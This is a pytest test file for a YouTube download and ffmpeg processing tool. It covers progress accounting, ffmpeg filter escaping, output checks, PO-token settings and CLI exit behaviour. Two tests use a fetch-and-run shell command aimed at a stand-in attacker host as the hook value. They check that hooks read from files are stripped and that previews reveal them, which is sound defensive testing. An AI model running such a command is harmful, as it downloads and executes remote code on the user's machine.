    )

    ytf.main()

    assert calls == [
        {
            "host": "localhost",
            "port": 9001,
            "output_dir": tmp_path,
            "queue_file": None,
            "pot_base_url": None,
            "pot_mode": "auto",
            "open_browser": False,
        }
    ]


def test_emit_progress_accounts_speed_without_sink():
    """CONFIRMED: every byte/speed accumulator sat BELOW the `if not sink: return` guard, so a CLI
    run (no web progress_sink) could never populate speed_stats() — the '[Speed] ... transfer'
    figure and the '[Speed] Throttle suspected' warning were dead code on the very surface they
    were written for. Accounting must run sinkless; only the UI payload push needs the sink."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    d._speed_samples = []
    # NO progress_sink attribute at all — the CLI case.
    M = 1024 * 1024
    d._emit_progress({'status': 'downloading', 'downloaded_bytes': 20 * M, 'speed': 2.0 * M,
                      'info_dict': {'format_id': '137'}})
    assert d._last_downloaded_bytes == 20 * M, 'byte accounting must not require a sink'
    assert d._speed_samples == [2.0 * M], 'speed samples must not require a sink'
    assert d._speed_peak == 2.0 * M
    assert YouTubeDownloader.speed_stats(d)['avg_speed'] == 2.0 * M
    print('test_emit_progress_accounts_speed_without_sink passed')


def _av_get_token(s, term):
    """Faithful emulation of ffmpeg's av_get_token (libavutil/avstring.c): backslash escapes the
    next char OUTSIDE quotes; inside '...' every char is copied RAW until the next quote — a
    backslash can NOT escape the closing quote there. Returns (value, chars_consumed)."""
    out, p = [], 0
    while p < len(s) and s[p] not in term:
        c = s[p]; p += 1
        if c == '\\' and p < len(s):
            out.append(s[p]); p += 1
        elif c == "'":
            while p < len(s) and s[p] != "'":
                out.append(s[p]); p += 1
            if p < len(s):
                p += 1
        else:
            out.append(c)
    return ''.join(out), p


def test_burn_in_apostrophe_survives_ffmpeg_two_level_parse():
    """CONFIRMED against a real ffmpeg: any title with an apostrophe failed with 'Error parsing
    filterchain'. Filter option values are parsed TWICE by av_get_token (graph level, then the
    filter's own option parser), and inside '...' a backslash cannot escape the closing quote —
    so the old  \\'  form closed the quote early and corrupted the graph. The correct form closes
    the quote, emits \\' via outside-quote escapes, and reopens:  ' -> '\\\\\\''  (verified live:
    framecrc of the escaped drawtext == framecrc of the same text via textfile=, and a
    subtitles= path with an apostrophe resolves instead of 'No such file')."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    hostile = "It's a: test, [x] 50% \\ done o'clock"
    wrapped = "'" + E._ff_drawtext_escape(hostile) + "'"     # exactly how the call site quotes it
    lvl1, used = _av_get_token(wrapped, ':,[]')
    assert used == len(wrapped), f'graph-level parse stopped early: {wrapped[used:]!r}'
    lvl2, used2 = _av_get_token(lvl1, ':')                   # drawtext's own option re-parse
    assert used2 == len(lvl1), f'option-level parse stopped early: {lvl1[used2:]!r}'
    assert lvl2 == hostile, f'text corrupted through the two parse levels: {lvl2!r}'

    # subtitles=/fontfile= paths take the same two-level trip
    path = "C:/Users/o'brien/it's a video.srt"
    quoted = E._ff_filter_path(path)
    lvl1, used = _av_get_token(quoted, ':,[]')
    assert used == len(quoted), 'graph-level parse of the path stopped early'
    lvl2, used2 = _av_get_token(lvl1, ':')
    assert used2 == len(lvl1), 'option-level parse of the path stopped early'
    assert lvl2 == path, f'path corrupted through the two parse levels: {lvl2!r}'
    print('test_burn_in_apostrophe_survives_ffmpeg_two_level_parse passed')


def test_verify_output_allows_single_explicit_format_id_one_stream():
    """CONFIRMED: --format-id 137 (video-only; format_id is deliberately CLI-exposed — see
    test_workspace_parity) downloads exactly what was asked, then _verify_output failed it with
    'no audio stream' (strict: job failed; loose: spurious warning). A SINGLE explicit id may
    legitimately name a one-stream format, so require at least one stream; a merged id
    ('137+140') still promises both and keeps the strict checks."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.downloader.last_info[str(src)] = {'duration': 100}
    # video-only itag: passes
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': True,
                                               'has_audio': False, 'size': 5_000_000}
    ok, reason = eng._verify_output(P('vid.mp4'), src,
                                    JobSpec(urls=['u'], verify_strict=True, format_id='137'))
    assert ok is True, reason
    # audio-only itag: passes
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': False,
                                               'has_audio': True, 'size': 5_000_000}
    ok, reason = eng._verify_output(P('vid.mp4'), src,
                                    JobSpec(urls=['u'], verify_strict=True, format_id='140'))
    assert ok is True, reason
    # a file with NO streams at all still fails even with an explicit id
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': False,
                                               'has_audio': False, 'size': 5_000_000}
    ok, reason = eng._verify_output(P('vid.mp4'), src,
                                    JobSpec(urls=['u'], verify_strict=True, format_id='137'))
    assert ok is False and 'stream' in reason
    # a MERGED id still requires both streams
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': True,
                                               'has_audio': False, 'size': 5_000_000}
    ok, reason = eng._verify_output(P('vid.mp4'), src,
                                    JobSpec(urls=['u'], verify_strict=True, format_id='137+140'))
    assert ok is False and 'audio' in reason
    print('test_verify_output_allows_single_explicit_format_id_one_stream passed')


def test_file_sourced_on_complete_hook_is_ignored_without_allow_hooks(tmp_path):
    """A hook read from a manifest or config file must not run unless opted in.

    `on_complete` runs a program when a job finishes. Typing it on the command line is consent.
    Reading it out of a FILE is not: manifests are exactly what people paste into issues to
    reproduce a problem, and `batch --queue` persists the hook into queue.json for the
    always-running worker to honour later. The web surface already treats this as a trust boundary
    and strips the field from any client-supplied job ("never let a web client supply a shell hook",
    webserver.py); the CLI honoured it from a file with no gate at all.
    """
    import yt_final

    spec = yt_final.JobSpec.from_dict({
        "urls": ["https://example.invalid/v"],
        "on_complete": "curl http://attacker.invalid/x.sh | sh",
    })
    removed = yt_final._strip_file_sourced_hooks([spec], False, "manifest test.json")
    assert removed == 1
    assert spec.on_complete is None


def test_file_sourced_on_complete_hook_survives_with_allow_hooks():
    """--allow-hooks is the opt-in, so the hook must be preserved verbatim."""
    import yt_final

    command = "ffmpeg -i {} -c copy /tmp/out.mkv"
    spec = yt_final.JobSpec.from_dict({
        "urls": ["https://example.invalid/v"],
        "on_complete": command,
    })
    removed = yt_final._strip_file_sourced_hooks([spec], True, "manifest test.json")
    assert removed == 0
    assert spec.on_complete == command


def test_dry_run_summary_reveals_an_on_complete_hook():
    """`--dry-run` is advertised as a preview, so it must not hide the one field that executes.

    Final/examples/jobs.example.json tells the user to "add --dry-run to preview", and the preview
    is JobSpec.summary() -- which listed section, format, encode mode, audio, loudnorm and subs, but
    not the command that runs when the job completes.
    """
    import yt_final

    command = "curl http://attacker.invalid/x.sh | sh"
    spec = yt_final.JobSpec.from_dict({"urls": ["https://example.invalid/v"], "on_complete": command})
    summary = spec.summary()
    assert command in summary, summary
    plain = yt_final.JobSpec.from_dict({"urls": ["https://example.invalid/v"]})
    assert "on-complete" not in plain.summary()


def test_bare_launch_without_a_tty_prints_help_instead_of_crashing():
    """`yt-final` with no subcommand and no terminal must not die in input().

    The bare launch opens an interactive menu whose first statement is input(). A desktop shortcut,
    a scheduled task, a pythonw launch, or any redirected invocation has no TTY, so that raised a
    bare EOFError traceback. A CLI should print help and exit 2.

    Note for anyone reproducing this on Windows: `< /dev/null` does NOT simulate it, because
    isatty() returns True for the NUL device (it is a character device). Use a real pipe.
    """
    import subprocess
    import sys

    result = subprocess.run(
        [sys.executable, str(Path(__file__).resolve().parent / "yt_final.py")],
        input="", capture_output=True, text=True, timeout=180,
    )
    assert result.returncode == 2, (result.returncode, result.stderr[-400:])
    assert "EOFError" not in result.stderr
    assert "no interactive terminal" in result.stderr.casefold()


def test_direct_script_propagates_the_exit_status():
    """`python yt_final.py` must report the same status as the installed `yt-final`.

    cli.py returns main()'s value, so the console script exited non-zero while the direct script
    always exited 0 -- the same invocation reporting different success to a shell script or a
    scheduler.
    """
    source = (Path(__file__).resolve().parent / "yt_final.py").read_text(encoding="utf-8")
    assert "raise SystemExit(main())" in source


def test_network_failures_get_a_written_remedy_like_every_other_category():
    """'network' is a classified category but had no branch, so it leaked raw resolver text.

    Every other category (bot, agegate, format, ratelimit) has a hand-written remedy; a down link
    surfaced `getaddrinfo failed`. DNS and proxy/TLS are separated because the fixes differ.
    """
    import yt_final

    message = yt_final.YouTubeDownloader._download_error_message
    dns = message(Exception("getaddrinfo failed"), None, False)
    assert "DNS" in dns and "getaddrinfo" not in dns
    proxied = message(Exception("proxy tunnel failed: SSL error"), None, False)
    assert "proxy" in proxied.casefold()
    generic = message(Exception("connection timed out"), None, False)
    assert "retried" in generic.casefold()


def _pot_extractor_args(mode, detected=("", "")):
    """Build extractor args for a PO-token mode with a stubbed provider probe."""
    from unittest import mock

    import yt_final

    downloader = yt_final.YouTubeDownloader.__new__(yt_final.YouTubeDownloader)
    downloader.pot_mode = mode
    downloader.pot_base_url = None
    with mock.patch.object(
        yt_final.YouTubeDownloader, "_pot_provider_status", return_value=detected
    ):
        args = {"youtube": {}}
        downloader._apply_pot_mode(args)
    return args


def test_no_provider_modes_tell_ytdlp_not_to_fetch_a_po_token():
    """Every first download printed `Error reaching GET http://127.0.0.1:1/ping`.

    The port-1 URL is a deliberate sentinel meaning "no HTTP provider", but the bgutil plugin still
    pinged it and logged the failure -- a line beginning with "Error", for an intended condition, on
    the DEFAULT mode with no provider installed. That is every new user's first command. It reads as
    a broken install and invites bug reports for a non-bug.

    yt-dlp's own `youtube:fetch_pot=never` returns before a PoTokenRequest is built, so no provider
    is consulted and nothing is pinged.
    """
    for mode, detected in (("auto", ("", "")), ("off", ("", "")), ("lazy", ("", ""))):
        args = _pot_extractor_args(mode, detected)
        assert args["youtube"].get("fetch_pot") == ["never"], (mode, args["youtube"])


def test_modes_with_a_live_provider_still_fetch_po_tokens():
    """The suppression must not reach any mode where a provider is meant to answer.

    `script` mode keeps the disabled HTTP base_url on purpose, and the plugin's "this is expected if
    you are using the script method" line is ACCURATE there -- so it is deliberately left alone.
    """
    for mode, detected in (
        ("auto", ("http", "http://127.0.0.1:4416")),
        ("lazy", ("http", "http://127.0.0.1:4416")),
        ("http", ("", "")),
        ("script", ("", "")),
    ):
        args = _pot_extractor_args(mode, detected)
        assert "fetch_pot" not in args["youtube"], (mode, args["youtube"])
